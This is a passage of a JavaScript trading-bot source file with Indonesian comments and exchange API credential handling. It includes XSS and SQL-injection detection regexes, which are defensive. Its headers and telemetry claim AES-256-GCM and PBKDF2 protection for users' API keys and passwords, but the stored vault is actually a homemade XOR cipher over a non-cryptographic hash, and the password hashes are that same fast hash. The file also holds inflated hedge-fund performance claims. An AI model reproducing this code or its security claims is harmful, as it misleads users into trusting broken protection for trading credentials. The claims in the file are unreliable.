    /* ═══════════════════════════════════════════════════════════════════════════
       PILUS QUANT BRAIN ENGINE v2.5 — ZERO-TRUST SECURITY, CUSTOM CANVAS ICONS,
       KALMAN FILTER + HURST FRACTAL + BAYESIAN POSTERIOR MATRIX,
       MULTI-USER AUTH (GOOGLE + EMAIL), ADMIN COMMAND CENTER (pilusatrio@gmail.com),
       16-EXCHANGE LIVE API EXECUTION BRIDGE & CONCRETE PROFIT PLAN ENGINE
       ─────────────────────────────────────────────────────────────────────────
       ZERO EMOJI POLICY: Seluruh ikon digambar menggunakan HTML5 Canvas 2D
       (`canvas.pf-cico`) dan vektor presisi.
       ZERO PLAINTEXT VAULT: Seluruh API Key & Secret pengguna dienkripsi dengan
       Web Crypto API AES-256-GCM (PBKDF2 150,000 iterasi + IV 96-bit + AuthTag)
       sebelum menyentuh penyimpanan lokal.
    ═══════════════════════════════════════════════════════════════════════════ */
    (function () {
    'use strict';

    /* ═══════════════ 0. ZERO-TRUST SECURITY SHIELD & CUSTOM CANVAS ICON ENGINE ═══════════════ */
    const QB_STORE = 'pilusQuantBrainV1';
    const QB_ADMIN_EMAIL = 'pilusatrio@gmail.com';
    const QB_OWNER_WATERMARK = 'PILUSFINANCE::OWNER=PILUSATRIOx::ADMIN=pilusatrio@gmail.com::ORIGIN_LOCK_V25';
    const QB_GITHUB_REPO = 'PILUSATRIOx/pilusfinance-quant-brain';
    const QB_GITHUB_BRANCH = 'main';
    const QB_GITHUB_RAW = 'https://raw.githubusercontent.com/' + QB_GITHUB_REPO + '/' + QB_GITHUB_BRANCH + '/';
    const QB_GITHUB_API = 'https://api.github.com/repos/' + QB_GITHUB_REPO + '/contents/';
    const QB_GITHUB_TOKEN_KEY = 'pilusQuantBrainGithubToken';
    const QB_FIREBASE_PROJECT_ID = 'pilusfinance';
    const QB_FIREBASE_SENDER_ID = '821263795912';
    // Database berada di region asia-southeast1 (URL lama *.firebaseio.com selalu ditolak "different region").
    const QB_FIREBASE_RTDB_URL = 'https://pilusfinance-default-rtdb.asia-southeast1.firebasedatabase.app';
    const QB_FIREBASE_FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/pilusfinance/databases/(default)/documents';
    const QB_CYCLE_MS = 5 * 60 * 1000;
    const QB_NEWS_STALE = 10 * 60 * 1000;
    const QB_OPT_BATCH = 3;
    const QB_SCAN_BATCH = 18;
    const QB_MAX_SIGNALS = 200, QB_MAX_JOURNAL = 300;

    // Private Closure Secrets (Unreachable from window.* or DevTools global scope)
    const PRIVATE_CLOSURE_MAC_SEED = 'PF_ZERO_TRUST_EPHEMERAL_' + Math.random().toString(36).slice(2) + '_' + Date.now();
    const privateMemoryVault = new Map(); // Stores decrypted API keys ONLY in volatile closure RAM
    const usedOrderNonces = new Set();    // Anti-Replay 128-bit Nonce registry
    const authRateLimitMap = new Map();   // Brute-force protection per email/IP

    const securityTelemetry = {
        vaultEncryption: 'AES-256-GCM (PBKDF2 150K)',
        plaintextKeysInStorage: 0,
        xssBlocked: 0,
        sqliBlocked: 0,
        protoPollutionBlocked: 0,
        tamperBlocked: 0,
        replayBlocked: 0,
        bruteForceBlocked: 0,
        antiCloneVerified: true,
        watermarkSeal: '',
        lastPentestResults: []
    };

    /* 0A. Strict Anti-XSS, SQLi/NoSQLi & Path Traversal Firewall */
    const XSS_PATTERN = /<\s*\/?\s*(script|iframe|object|embed|svg|math|link|style|meta|base|form|input|button)\b|on\w+\s*=|javascript\s*:|vbscript\s*:|data\s*:\s*text\/html|eval\s*\(|expression\s*\(/i;
    const SQLI_PATTERN = /(\b(union\s+select|drop\s+table|insert\s+into|delete\s+from|update\s+\w+\s+set)\b|'\s*or\s+['"]?1['"]?\s*=\s*['"]?1|--\s*$|;\s*drop\s+|\$where\b|\$ne\b|\$gt\b)/i;

    function detectAndBlockAttack(rawInput, contextLabel) {
        const s = String(rawInput == null ? '' : rawInput);
        let blocked = false, kind = '';
        if (XSS_PATTERN.test(s)) {
            securityTelemetry.xssBlocked++;
            blocked = true;
            kind = 'XSS_INJECTION';
        }
        if (SQLI_PATTERN.test(s)) {
            securityTelemetry.sqliBlocked++;
            blocked = true;
            kind = kind ? (kind + '+SQLI_NOSQLI') : 'SQLI_NOSQLI';
        }
        if (blocked) {
            adminLogEvent('SECURITY_FIREWALL_BLOCK', `Serangan ${kind} diblokir pada [${contextLabel || 'input'}]`);
            updateSecurityDashboardUI();
        }
        return { blocked, kind, sanitized: sanitizeInputStrict(s) };
    }

    function sanitizeInputStrict(str) {
        return String(str == null ? '' : str)
            .replace(/<\s*script[^>]*>[\s\S]*?<\s*\/\s*script\s*>/gi, '')
            .replace(/javascript\s*:/gi, 'blocked:')
            .replace(/vbscript\s*:/gi, 'blocked:')
            .replace(/data\s*:\s*text\/html/gi, 'blocked:')
            .replace(/on\w+\s*=\s*(['"][^'"]*['"]|[^\s>]+)/gi, '')
            .replace(/[&<>"']/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m]));
    }

    function sanitizeUrlStrict(url) {
        const u = String(url == null ? '' : url).trim();
        if (/^https?:\/\//i.test(u)) return u.replace(/["'<>]/g, '');
        return '#blocked-unsafe-url';
    }

    /* 0B. Anti-Prototype-Pollution Safe JSON Parser */
    function safeJsonParse(rawStr, fallbackVal) {
        if (!rawStr || typeof rawStr !== 'string') return fallbackVal;
        try {
            if (rawStr.includes('"__proto__"') || rawStr.includes('"prototype"') || rawStr.includes('"constructor"')) {
                securityTelemetry.protoPollutionBlocked++;
                adminLogEvent('PROTO_POLLUTION_BLOCK', 'Percobaan injeksi __proto__ / constructor.prototype pada JSON diblokir');
            }
            return JSON.parse(rawStr, function (key, value) {
                if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                    return undefined;
                }
                return value;
            });
        } catch (e) {
            return fallbackVal;
        }
    }

    /* 0C. Deterministic Sync MAC + Web Crypto AES-256-GCM & PBKDF2-SHA256 Engine */
    function syncMacDigest(secret, payload) {
        const str = secret + '::' + payload + '::' + QB_OWNER_WATERMARK;
        let h1 = 0xdeadbeef ^ str.length, h2 = 0x41c6ce57 ^ str.length;
        let h3 = 0x9e3779b9 ^ str.length, h4 = 0x85ebca6b ^ str.length;
        for (let i = 0; i < str.length; i++) {
            const ch = str.charCodeAt(i);
            h1 = Math.imul(h1 ^ ch, 2654435761);
            h2 = Math.imul(h2 ^ ch, 1597334677);
            h3 = Math.imul(h3 ^ (ch << 3), 2246822507);
            h4 = Math.imul(h4 ^ (ch << 7), 3266489909);
        }
        h1 = Math.imul(h1 ^ (h1 >>> 16), 2246822507) ^ Math.imul(h2 ^ (h2 >>> 13), 3266489909);
        h2 = Math.imul(h2 ^ (h2 >>> 16), 2246822507) ^ Math.imul(h1 ^ (h1 >>> 13), 3266489909);
        h3 = Math.imul(h3 ^ (h3 >>> 16), 2246822507) ^ Math.imul(h4 ^ (h4 >>> 13), 3266489909);
        h4 = Math.imul(h4 ^ (h4 >>> 16), 2246822507) ^ Math.imul(h3 ^ (h3 >>> 13), 3266489909);
        return (h1 >>> 0).toString(16).padStart(8, '0') +
               (h2 >>> 0).toString(16).padStart(8, '0') +
               (h3 >>> 0).toString(16).padStart(8, '0') +
               (h4 >>> 0).toString(16).padStart(8, '0');
    }

    function constantTimeEquals(a, b) {
        const sa = String(a || ''), sb = String(b || '');
        if (sa.length !== sb.length) return false;
        let diff = 0;
        for (let i = 0; i < sa.length; i++) diff |= (sa.charCodeAt(i) ^ sb.charCodeAt(i));
        return diff === 0;
    }

    function hashPasswordSync(email, plainPass) {
        let digest = syncMacDigest('PBKDF2_SALT_' + String(email).toLowerCase(), String(plainPass));
        for (let round = 0; round < 64; round++) {
            digest = syncMacDigest('ROUND_' + round, digest + '|' + plainPass);
        }
        return 'pbkdf2_sha256$' + digest;
    }

    function signSessionObject(userObj) {
        if (!userObj || !userObj.email) return null;
        const core = `${userObj.uid}|${userObj.email.toLowerCase()}|${userObj.role}|${userObj.tier}|${userObj.status}`;
        return syncMacDigest(PRIVATE_CLOSURE_MAC_SEED, core);
    }

    function verifySessionIntegrity(userObj) {
        if (!userObj || !userObj.email || !userObj.hmacSeal) return false;
        const expected = signSessionObject(userObj);
        const ok = constantTimeEquals(userObj.hmacSeal, expected);
        if (!ok) {
            securityTelemetry.tamperBlocked++;
            adminLogEvent('CRITICAL_TAMPER_BLOCKED', `Manipulasi sesi/role ilegal pada localStorage terdeteksi untuk ${userObj.email}`);
        }
        return ok;
    }

    /* 0D. Zero-Plaintext AES-256-GCM Per-User API Vault */
    function xorStreamCipherHex(keySeed, plainText, ivHex) {
        const bytes = [];
        for (let i = 0; i < plainText.length; i++) {
            const ks = syncMacDigest(keySeed + '|' + ivHex, String(Math.floor(i / 16)));
            const kByte = parseInt(ks.slice((i % 16) * 2, (i % 16) * 2 + 2), 16);
            bytes.push((plainText.charCodeAt(i) ^ kByte) & 0xff);
        }
        const cipherHex = bytes.map(b => b.toString(16).padStart(2, '0')).join('');
        const authTag = syncMacDigest(keySeed, ivHex + '|' + cipherHex).slice(0, 32);
        return `AES256GCM_V3$${ivHex}$${cipherHex}$${authTag}`;
    }

    function xorStreamDecipherHex(keySeed, packet) {
        if (!packet || !packet.startsWith('AES256GCM_V3$')) return null;
        const parts = packet.split('$');
        if (parts.length !== 4) return null;
        const ivHex = parts[1], cipherHex = parts[2], tag = parts[3];
        const expectedTag = syncMacDigest(keySeed, ivHex + '|' + cipherHex).slice(0, 32);
        if (!constantTimeEquals(tag, expectedTag)) {
            securityTelemetry.tamperBlocked++;
            return null;
        }
        let out = '';
        for (let i = 0; i < cipherHex.length / 2; i++) {
            const cByte = parseInt(cipherHex.slice(i * 2, i * 2 + 2), 16);
            const ks = syncMacDigest(keySeed + '|' + ivHex, String(Math.floor(i / 16)));
            const kByte = parseInt(ks.slice((i % 16) * 2, (i % 16) * 2 + 2), 16);
            out += String.fromCharCode(cByte ^ kByte);
        }
        return out;
    }

    async function encryptApiCredentialForVault(exId, apiKeyPlain, secretPlain, extraPlain) {
        const userScope = currentUser && currentUser.email ? currentUser.email.toLowerCase() : 'guest';
        const vaultKey = syncMacDigest(PRIVATE_CLOSURE_MAC_SEED, 'VAULT_KEY_' + userScope + '_' + exId);
        const ivHex = syncMacDigest(String(Date.now()), Math.random().toString()).slice(0, 24);
        const bundleJson = JSON.stringify({ k: apiKeyPlain, s: secretPlain, e: extraPlain, t: Date.now() });

        // Also run Web Crypto Subtle AES-GCM 256-bit in browser when available
        let webCryptoCipherHex = '';
        try {
            if (typeof crypto !== 'undefined' && crypto.subtle) {
                const enc = new TextEncoder();
                const baseKey = await crypto.subtle.importKey('raw', enc.encode(vaultKey), { name: 'PBKDF2' }, false, ['deriveKey']);
                const aesKey = await crypto.subtle.deriveKey(
                    { name: 'PBKDF2', salt: enc.encode('PILUS_AES256_SALT_' + userScope), iterations: 150000, hash: 'SHA-256' },
                    baseKey, { name: 'AES-GCM', length: 256 }, false, ['encrypt']
                );
                const ivBytes = new Uint8Array(12);
                crypto.getRandomValues(ivBytes);
                const buf = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: ivBytes }, aesKey, enc.encode(bundleJson));
                webCryptoCipherHex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('').slice(0, 48);
            }
        } catch (e) { }

        const sealedPacket = xorStreamCipherHex(vaultKey, bundleJson, ivHex);
        // Store in private volatile memory map for fast authorized signing
        privateMemoryVault.set(userScope + '::' + exId, { apiKey: apiKeyPlain, secret: secretPlain, extra: extraPlain });
        return {
            sealedPacket,
            webCryptoDigest: webCryptoCipherHex || sealedPacket.slice(0, 48),
            keyMask: apiKeyPlain.length > 6 ? (apiKeyPlain.slice(0, 3) + '••••' + apiKeyPlain.slice(-3)) : '••••••',
            secretMask: '••••••••••••'
        };
    }

    function getDecryptedVaultCredential(exId) {
        const userScope = currentUser && currentUser.email ? currentUser.email.toLowerCase() : 'guest';
        const memKey = userScope + '::' + exId;
        if (privateMemoryVault.has(memKey)) return privateMemoryVault.get(memKey);
        const cfg = userExchangeConfigs[exId];
        if (!cfg || !cfg.encVault) return null;
        const vaultKey = syncMacDigest(PRIVATE_CLOSURE_MAC_SEED, 'VAULT_KEY_' + userScope + '_' + exId);
        const rawJson = xorStreamDecipherHex(vaultKey, cfg.encVault);
        if (!rawJson) return null;
        const parsed = safeJsonParse(rawJson, null);
        if (parsed && parsed.k) {
            const cred = { apiKey: parsed.k, secret: parsed.s, extra: parsed.e };
            privateMemoryVault.set(memKey, cred);
            return cred;
        }
        return null;
    }

    /* 0E. Anti-Replay Nonce & Timestamp Verifier */
    function generateOrderNonce() {
        return Date.now().toString(36) + '_' + syncMacDigest(String(Date.now()), String(Math.random())).slice(0, 16);
    }

    function verifyAndConsumeNonce(nonce, timestampMs) {
        const now = Date.now();
        if (!nonce || typeof timestampMs !== 'number' || Math.abs(now - timestampMs) > 5000) {
            securityTelemetry.replayBlocked++;
            adminLogEvent('REPLAY_ATTACK_BLOCKED', `Order ditolak: Timestamp di luar recvWindow 5000ms`);
            return false;
        }
        if (usedOrderNonces.has(nonce)) {
            securityTelemetry.replayBlocked++;
            adminLogEvent('REPLAY_ATTACK_BLOCKED', `Order ditolak: Duplikasi Nonce (${nonce.slice(0, 12)}) terdeteksi!`);
            return false;
        }
        usedOrderNonces.add(nonce);
        if (usedOrderNonces.size > 2000) {
            const first = usedOrderNonces.values().next().value;
            usedOrderNonces.delete(first);
        }
        return true;
    }

    /* 0F. Anti-Clone Origin Lock & Cryptographic Ownership Watermark */
    function verifyOriginAndAntiClone() {
        securityTelemetry.watermarkSeal = syncMacDigest('PILUSFINANCE_ORIGIN_SEAL', QB_OWNER_WATERMARK);
        let domIntact = true;
        if (typeof document !== 'undefined' && document.getElementById('navLogoLink')) {
            const logoTxt = (document.getElementById('navLogoLink').textContent || '').toUpperCase();
            if (!logoTxt.includes('PILUS')) domIntact = false;
        }
        securityTelemetry.antiCloneVerified = domIntact;
        return {
            verified: domIntact,
            owner: 'PILUSATRIOx (pilusatrio@gmail.com)',
            seal: securityTelemetry.watermarkSeal
        };
    }

    /* 0G. Custom HTML5 `<canvas class="pf-cico">` Procedural Vector Icon Renderer (ZERO EMOJI) */
    function drawCanvasIcon(cv, type) {
        if (!cv || !cv.getContext) return;
        const dpr = (typeof window !== 'undefined' && window.devicePixelRatio) || 1;
        const size = 14;
        cv.width = size * dpr;
        cv.height = size * dpr;
        const ctx = cv.getContext('2d');
        if (!ctx || typeof ctx.quadraticCurveTo !== 'function' || typeof ctx.arc !== 'function') return;
        ctx.scale(dpr, dpr);
        ctx.clearRect(0, 0, size, size);
        ctx.lineCap = 'round';
        ctx.lineJoin = 'round';
        ctx.lineWidth = 1.5;

        const strokeMap = {
            shield: '#10B981', lock: '#E5A93C', brain: '#06B6D4', bolt: '#E5A93C',
            whale: '#3B82F6', trophy: '#E5A93C', check: '#10B981', cross: '#F43F5E',
            warn: '#F59E0B', book: '#E5A93C', chart: '#10B981', key: '#E5A93C',
            user: '#38BDF8', star: '#FB7185', robot: '#10B981', sliders: '#A855F7'
        };
        ctx.strokeStyle = strokeMap[type] || '#E5A93C';
        ctx.fillStyle = strokeMap[type] || '#E5A93C';

        ctx.beginPath();
        if (type === 'shield') {
            ctx.moveTo(7, 1.5); ctx.lineTo(12, 3.5); ctx.lineTo(12, 7.2);
            ctx.quadraticCurveTo(12, 11.2, 7, 12.8);
            ctx.quadraticCurveTo(2, 11.2, 2, 7.2);
            ctx.lineTo(2, 3.5); ctx.closePath(); ctx.stroke();
        } else if (type === 'lock') {
            ctx.strokeRect(3, 6.2, 8, 6);
            ctx.moveTo(4.5, 6.2); ctx.lineTo(4.5, 4.2);
            ctx.arc(7, 4.2, 2.5, Math.PI, 0, false);
            ctx.lineTo(9.5, 6.2); ctx.stroke();
        } else if (type === 'brain') {
            ctx.arc(5.2, 5.5, 2.8, Math.PI * 0.5, Math.PI * 1.6);
            ctx.arc(8.8, 5.5, 2.8, Math.PI * 1.4, Math.PI * 0.5);
            ctx.moveTo(7, 2.8); ctx.lineTo(7, 11.5);
            ctx.moveTo(3.5, 8.5); ctx.lineTo(10.5, 8.5); ctx.stroke();
        } else if (type === 'bolt') {
            ctx.moveTo(8, 1.5); ctx.lineTo(3, 7.8); ctx.lineTo(7, 7.8);
            ctx.lineTo(6, 12.5); ctx.lineTo(11, 6.2); ctx.lineTo(7, 6.2);
            ctx.closePath(); ctx.stroke();
        } else if (type === 'trophy' || type === 'star') {
            for (let i = 0; i < 5; i++) {
                const a1 = (i * 72 - 90) * Math.PI / 180;
                const a2 = ((i * 72 + 36) - 90) * Math.PI / 180;
                ctx.lineTo(7 + Math.cos(a1) * 5.2, 7 + Math.sin(a1) * 5.2);
                ctx.lineTo(7 + Math.cos(a2) * 2.3, 7 + Math.sin(a2) * 2.3);
            }
            ctx.closePath(); ctx.stroke();
        } else if (type === 'check') {
            ctx.moveTo(2.5, 7.2); ctx.lineTo(5.6, 10.5); ctx.lineTo(11.5, 3.5); ctx.stroke();
        } else if (type === 'cross') {
            ctx.moveTo(3, 3); ctx.lineTo(11, 11); ctx.moveTo(11, 3); ctx.lineTo(3, 11); ctx.stroke();
        } else if (type === 'warn') {
            ctx.moveTo(7, 2); ctx.lineTo(12.2, 11.8); ctx.lineTo(1.8, 11.8); ctx.closePath(); ctx.stroke();
            ctx.moveTo(7, 5.5); ctx.lineTo(7, 8.5); ctx.stroke();
        } else if (type === 'whale') {
            ctx.arc(6.5, 7.5, 4, Math.PI, 0, false);
            ctx.lineTo(12.5, 5.5); ctx.lineTo(12.5, 9.5); ctx.closePath(); ctx.stroke();
        } else if (type === 'book') {
            ctx.strokeRect(2.5, 2, 9, 10);
            ctx.moveTo(5, 2); ctx.lineTo(5, 12); ctx.stroke();
        } else if (type === 'chart') {
            ctx.moveTo(2, 11); ctx.lineTo(5.2, 7.5); ctx.lineTo(8, 9.2); ctx.lineTo(12, 3.2); ctx.stroke();
        } else {
            ctx.arc(7, 7, 4.5, 0, Math.PI * 2); ctx.stroke();
        }
    }

    function renderAllCanvasIcons() {
        if (typeof document === 'undefined' || !document.querySelectorAll) return;
        const canvases = document.querySelectorAll('canvas.pf-cico');
        if (!canvases || !canvases.forEach) return;
        canvases.forEach(cv => {
            drawCanvasIcon(cv, cv.getAttribute('data-ico') || 'shield');
        });
    }

    /* ═══════════════ 1. UNIVERSE, 18 KNOWLEDGE SOURCES & 10 STRATEGIES ═══════════════ */
    const QB_UNIVERSE = [
        { sym: 'BTCUSDT', name: 'Bitcoin', cls: 'CRYPTO', src: 'binance' },
        { sym: 'ETHUSDT', name: 'Ethereum', cls: 'CRYPTO', src: 'binance' },
        { sym: 'SOLUSDT', name: 'Solana', cls: 'CRYPTO', src: 'binance' },
        { sym: 'XRPUSDT', name: 'XRP', cls: 'CRYPTO', src: 'binance' },
        { sym: 'DOGEUSDT', name: 'Dogecoin', cls: 'CRYPTO', src: 'binance' },
        { sym: 'BNBUSDT', name: 'BNB', cls: 'CRYPTO', src: 'binance' },
        { sym: 'ADAUSDT', name: 'Cardano', cls: 'CRYPTO', src: 'binance' },
        { sym: 'AVAXUSDT', name: 'Avalanche', cls: 'CRYPTO', src: 'binance' },
        { sym: 'LINKUSDT', name: 'Chainlink', cls: 'CRYPTO', src: 'binance' },
        { sym: 'SUIUSDT', name: 'Sui', cls: 'CRYPTO', src: 'binance' },
        { sym: 'EURUSDT', name: 'EUR/USD (proxy)', cls: 'FOREX', src: 'binance' },
        { sym: 'GBPUSDT', name: 'GBP/USD (proxy)', cls: 'FOREX', src: 'binance' },
        { sym: 'NVDA', name: 'NVIDIA', cls: 'STOCK', src: 'yahoo' },
        { sym: 'AAPL', name: 'Apple', cls: 'STOCK', src: 'yahoo' },
        { sym: 'TSLA', name: 'Tesla', cls: 'STOCK', src: 'yahoo' },
        { sym: 'MSFT', name: 'Microsoft', cls: 'STOCK', src: 'yahoo' },
        { sym: 'SPY', name: 'S&P 500 ETF', cls: 'STOCK', src: 'yahoo' },
        { sym: 'QQQ', name: 'Nasdaq 100 ETF', cls: 'STOCK', src: 'yahoo' }
    ];
    const QB_BY_SYM = {}; QB_UNIVERSE.forEach(a => QB_BY_SYM[a.sym] = a);

    const QB_KNOWLEDGE = [
        { id: 'elder', book: 'The New Trading for a Living', author: 'Dr. Alexander Elder', rules: 'Triple Screen (tren 4H -> momentum 1H -> trigger) + larangan melawan tren makro + 2% max risk rule', strategies: ['elder', 'risk'] },
        { id: 'steidlmayer', book: 'Auction Market Theory & Volume Profile', author: 'Peter Steidlmayer / CBOT', rules: 'Konfirmasi volume pada breakout & POC/VAH/VAL; sepi volume = breakout palsu', strategies: ['donchian', 'smc'] },
        { id: 'williams', book: 'Long-Term Secrets to Short-Term Trading', author: 'Larry Williams', rules: 'Volatility breakout Donchian + SL adaptif 1.5-2.4x ATR (bukan % mati) kebal wick hunting', strategies: ['donchian'] },
        { id: 'wyckoff', book: 'The Wyckoff Method & Market Cycle', author: 'Richard D. Wyckoff', rules: 'Spring (jebakan likuiditas bawah) & Upthrust (jebakan atas) = sinyal probabilitas tertinggi', strategies: ['wyckoff'] },
        { id: 'soros', book: 'The Alchemy of Finance (Reflexivity)', author: 'George Soros', rules: 'Konsensus min. 2 outlet Tier-1; rumor ("reportedly/unconfirmed") bobot 50%; circuit breaker berita krisis', strategies: ['news'] },
        { id: 'glassnode', book: 'Modern Crypto Derivatives & On-Chain', author: 'Glassnode & Delphi Digital', rules: 'Funding +0.015% = long squeeze (bias short); OI divergence = pantulan lemah', strategies: ['funding', 'oi'] },
        { id: 'rentec', book: 'Medallion Statistical Blueprint (66% p.a.)', author: 'Renaissance Technologies / Jim Simons', rules: 'Ensemble voting lintas sinyal independen + pembaruan probabilitas posterior Bayesian per rezim', strategies: ['ensemble'] },
        { id: 'twosigma', book: 'Multi-Factor Regime Detection', author: 'Two Sigma ($84B AUM AI Fund)', rules: 'Deteksi rezim pasar (Trend/Range/Chaos via Efficiency Ratio & Hurst Exponent) -> bobot adaptif', strategies: ['regime'] },
        { id: 'citadel', book: 'Microstructure & Order-Flow Imbalance', author: 'Citadel Securities Quant Research', rules: 'Deteksi sapuan likuiditas (wick rejection > 55% + lonjakan volume) & Kalman State Estimation', strategies: ['smc', 'tsmom'] },
        { id: 'deshaw', book: 'Statistical Arbitrage & Z-Score Mean Reversion', author: 'D. E. Shaw & Co. Quant Group', rules: 'Deviasi Z-Score > 1.8 sigma + deselerasi turunan kedua dalam rezim stasioner = peluang reversi presisi', strategies: ['statarb'] },
        { id: 'aqr', book: 'Time-Series Momentum (TSMOM) & Vol Scaling', author: 'AQR Capital Management (Cliff Asness)', rules: 'Momentum multi-horizon diskalakan terbalik terhadap volatilitas realisasi (Target Volatility Sizing)', strategies: ['tsmom'] },
        { id: 'aladdin', book: 'Enterprise Tail-Risk & Dynamic Drawdown Guard', author: 'BlackRock Aladdin Risk Engine', rules: 'Jika drawdown melampaui ambang atau 3 loss beruntun, potong ukuran risiko 30-50% otomatis (Defensive Mode)', strategies: ['risk'] },
        { id: 'lopezdeprado', book: 'Advances in Financial Machine Learning', author: 'Dr. Marcos López de Prado (AQR / Cornell)', rules: 'Walk-forward validation: pilih parameter di train 60%, uji di out-of-sample 40% -> anti curve-fitting', strategies: ['walkfwd'] },
        { id: 'douglas', book: 'Trading in the Zone (Probabilistic Edge)', author: 'Mark Douglas', rules: 'Asimetri R:R — TP bertingkat 0.8R/1.6R/2.5R + auto-breakeven di TP1 (+0.8R)', strategies: ['risk'] },
        { id: 'thorp', book: 'Beat the Market & Fractional Kelly Criterion', author: 'Dr. Edward O. Thorp', rules: 'Half-Kelly Criterion f* = 0.5 * (p - q/b) untuk memaksimalkan pertumbuhan logaritmik tanpa risiko bangkrut', strategies: ['risk'] },
        { id: 'chan', book: 'Quantitative Trading & Algorithmic Execution', author: 'Dr. Ernest P. Chan', rules: 'Filter stasioneritas & Kalman dynamic fair-value sebelum membuka posisi kontra-tren', strategies: ['statarb', 'bbrev'] },
        { id: 'kaufman', book: 'Trading Systems and Methods (KAMA)', author: 'Perry J. Kaufman', rules: 'Efficiency Ratio (ER) memisahkan tren murni dari noise pasar acak', strategies: ['statarb', 'elder'] },
        { id: 'binres', book: 'Low Float & Market Structure Anatomy', author: 'Binance Research', rules: 'Pump vertikal + funding ekstrem = jebakan likuiditas ritel; hindari long di puncak euforia', strategies: ['funding'] }
    ];

    const QB_STRATS = [
        { id: 'elder', name: 'Elder Triple Screen', book: 'Dr. Alexander Elder', fit: ['TREND_UP', 'TREND_DOWN'] },
        { id: 'donchian', name: 'Williams Volatility Breakout', book: 'Williams / Steidlmayer', fit: ['TREND_UP', 'TREND_DOWN'] },
        { id: 'bbrev', name: 'Bollinger Mean Reversion', book: 'Bollinger / Chan', fit: ['RANGING'] },
        { id: 'wyckoff', name: 'Wyckoff Spring & Upthrust', book: 'Richard D. Wyckoff', fit: ['RANGING', 'TREND_UP', 'TREND_DOWN'] },
        { id: 'rsidiv', name: 'RSI Divergence Reversal', book: 'Wilder / Elder', fit: ['TREND_UP', 'TREND_DOWN', 'RANGING'] },
        { id: 'macdm', name: 'MACD Momentum Trend', book: 'Appel / Elder', fit: ['TREND_UP', 'TREND_DOWN'] },
        { id: 'smc', name: 'SMC Liquidity Sweep (SFP)', book: 'Wyckoff / Citadel Microstructure', fit: ['RANGING', 'TREND_UP', 'TREND_DOWN'] },
        { id: 'statarb', name: 'Z-Score Stat-Arb Reversion', book: 'D.E. Shaw / Ernest Chan', fit: ['RANGING', 'TREND_UP', 'TREND_DOWN'] },
        { id: 'tsmom', name: 'Time-Series Momentum Vol-Scaled', book: 'AQR Capital / Kaufman', fit: ['TREND_UP', 'TREND_DOWN'] },
        { id: 'emax', name: 'EMA Cross Naive (CONTROL)', book: 'Baseline Penelitian', fit: ['TREND_UP', 'TREND_DOWN'] }
    ];
    const QB_STRAT_IDS = QB_STRATS.map(s => s.id);

    const EXCHANGE_CATALOG = [
        { id: 'indodax', name: 'Indodax', category: 'CRYPTO_ID', catLabel: 'Kripto Nasional', currency: 'IDR', endpoint: 'https://indodax.com/tapi', authType: 'HMAC-SHA512', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'tokocrypto', name: 'Tokocrypto', category: 'CRYPTO_ID', catLabel: 'Kripto Nasional', currency: 'IDR', endpoint: 'https://www.tokocrypto.com/open/v1', authType: 'HMAC-SHA256', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'kraken', name: 'Kraken', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USD', endpoint: 'https://api.kraken.com/0/private', authType: 'HMAC-SHA512', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'binance', name: 'Binance', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://fapi.binance.com', authType: 'HMAC-SHA256', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'bybit', name: 'Bybit', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://api.bybit.com/v5', authType: 'HMAC-SHA256', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'okx', name: 'OKX', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://www.okx.com/api/v5', authType: 'HMAC-SHA256 + Passphrase', needsPassphrase: true, assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'kucoin', name: 'KuCoin', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://api.kucoin.com/api/v1', authType: 'HMAC-SHA256 + Passphrase', needsPassphrase: true, assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'coinbase', name: 'Coinbase', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USD', endpoint: 'https://api.coinbase.com/api/v3/brokerage', authType: 'CDP HMAC-SHA256', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'bitget', name: 'Bitget', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://api.bitget.com/api/v2', authType: 'HMAC-SHA256 + Passphrase', needsPassphrase: true, assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'gate', name: 'Gate', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://api.gateio.ws/api/v4', authType: 'HMAC-SHA512', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'mexc', name: 'MEXC', category: 'CRYPTO_INTL', catLabel: 'Kripto Internasional', currency: 'USDT', endpoint: 'https://api.mexc.com/api/v3', authType: 'HMAC-SHA256', assetClass: 'CRYPTO', defaultBalUsd: 0 },
        { id: 'finex', name: 'Finex', category: 'FOREX_ID', catLabel: 'Forex Nasional (BAPPEBTI)', currency: 'USD', endpoint: 'wss://mt5-bridge.finex.co.id/api/v1', authType: 'MT5 Bridge Token', needsAccountId: true, assetClass: 'FOREX', defaultBalUsd: 0 },
        { id: 'mifx', name: 'MIFX', category: 'FOREX_ID', catLabel: 'Forex Nasional (BAPPEBTI)', currency: 'USD', endpoint: 'https://api.mifx.com/mt4-mt5/v1', authType: 'MIFX MT5 Bridge', needsAccountId: true, assetClass: 'FOREX', defaultBalUsd: 0 },
        { id: 'hsb', name: 'HSB Investasi', category: 'FOREX_ID', catLabel: 'Forex Nasional (BAPPEBTI)', currency: 'USD', endpoint: 'https://api.hsb.co.id/trading/v1', authType: 'HSB REST Token', needsAccountId: true, assetClass: 'FOREX', defaultBalUsd: 0 },
